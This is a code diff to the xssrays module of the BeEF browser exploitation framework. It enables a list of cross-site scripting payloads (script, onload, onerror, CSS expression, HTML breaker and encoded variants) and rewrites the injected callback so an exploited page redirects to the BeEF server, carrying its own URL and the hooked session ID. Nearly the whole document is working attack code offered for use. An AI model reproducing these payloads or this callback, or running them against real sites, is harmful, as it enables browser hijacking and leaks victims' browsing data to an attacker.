@@ -49,22 +49,20 @@ beef.net.xssrays = {
     //browser-specific attack vectors available strings: ALL, FF, IE, S, C, O
     vectors: [
 
-//				  {input:"',XSS,'", name: 'Standard DOM based injection single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:"\',XSS,\'", name: 'Standard DOM based injection single quote', browser: 'ALL',url:true,form:true,path:true},
 				  {input:'",XSS,"', name: 'Standard DOM based injection double quote', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:'\'><script>XSS<\/script>', name: 'Standard script injection single quote', browser: 'ALL',url:true,form:true,path:true},
-				  {input:'"><script>XSS<\/script>', name: 'Standard script injection double quote', browser: 'ALL',url:true,form:true,path:true}, //,
-//				  {input:'\'><body onload=\'XSS\'>', name: 'body onload single quote', browser: 'ALL',url:true,form:true,path:true},
-				  {input:'"><body onload="XSS">', name: 'body onload double quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'\'"><script>XSS<\/script>', name: 'Standard script injection', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'\'"><body onload="XSS">', name: 'body onload', browser: 'ALL',url:true,form:true,path:true},
 				  {input:'%27%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E', name: 'url encoded single quote', browser: 'ALL',url:true,form:true,path:true},
 				  {input:'%22%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E', name: 'url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
 				  {input:'%25%32%37%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45', name: 'double url encoded single quote', browser: 'ALL',url:true,form:true,path:true},
 				  {input:'%25%32%32%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45', name: 'double url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
 				  {input:'%%32%35%%33%32%%33%32%%32%35%%33%33%%34%35%%32%35%%33%33%%34%33%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35XSS%%32%35%%33%33%%34%33%%32%35%%33%32%%34%36%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35', name: 'double nibble url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true}
-//				  {input:'" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'', name: 'Image input overwrite based injection', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:"' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/", name: 'onload event injection', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true},
-//				  {input:"'},XSS,function x(){//", name: 'DOM based function breaker single quote', browser: 'ALL',url:true,form:true,path:true},
+				  {input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true},
+				  {input:'" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'', name: 'Image input overwrite based injection', browser: 'ALL',url:true,form:true,path:true},
+				  {input:"' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/", name: 'onload event injection', browser: 'ALL',url:true,form:true,path:true},
+				  {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true},
+				  {input:"'},XSS,function x(){//", name: 'DOM based function breaker single quote', browser: 'ALL',url:true,form:true,path:true},
 				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},
 				  {input:'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', name: 'DOM based innerHTML injection', browser: 'ALL',url:true,form:true,path:true},
   				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},
@@ -341,7 +339,7 @@ beef.net.xssrays = {
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
                         beefCallback = "location='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
-                            + "&action=ray" + "&p=" + ray.vector.poc + "&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
+                            + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
 
                         exploit = vector.input.replace(/XSS/g, beefCallback);
 
@@ -368,7 +366,7 @@ beef.net.xssrays = {
                 beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
                 beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
-                    + "&action=ray" + "&p=" + ray.vector.poc + "&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
+                    + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
 
                 exploit = vector.input.replace(/XSS/g, beefCallback);
 
@@ -424,7 +422,7 @@ beef.net.xssrays = {
                         beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
 
                         beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
-                            + "&action=ray" + "&p=" + ray.vector.poc + "&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
+                            + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";
 
                         exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
                         form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
